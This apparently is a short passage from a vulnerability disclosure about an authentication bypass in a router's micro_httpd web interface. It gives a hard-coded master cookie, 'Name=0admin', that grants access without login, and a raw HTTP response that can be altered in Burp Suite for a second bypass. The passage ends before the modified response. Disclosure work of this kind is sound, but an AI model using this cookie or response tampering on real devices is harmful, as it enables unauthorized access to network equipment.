|  |  |
|  | The vulnerability exists in plain text & hard coded cookie. Using any cookie manager extension, an attacker can bypass login page by setting the following Master Cookie. |
|  |  |
|  | Cookie: Name=0admin |
|  |  |
|  | Then access the homepage which will no longer require authentication. |
|  | http://192.168.10.1/ |
|  |  |
|  | Due to improper session implementation, there is another way to bypass login. The response header of homepage without authentication looks like this. |
|  |  |
|  | HTTP/1.1 200 Ok |
|  | Server: micro\_httpd |
|  | Cache-Control: no-cache |
|  | Date: Tue, 03 Apr 2018 18:33:12 GMT |
|  | Set-Cookie: Name=; path=/ |
|  | Content-Type: text/html |
|  | Connection: close |
|  |  |
|  | <html><head><script language='javascript'> |
|  | parent.location='login.html' |
|  | </script></head><body></body></html>HTTP/1.1 200 Ok |

|  | Connection: close |
|  |  |
|  | <html> |
|  | <head> |
|  | .. continue to actual homepage source |
|  |  |
|  | The response header looks totally messed up and by triggering burp suite and modifying it to following will grant access to homepage without authentication. |
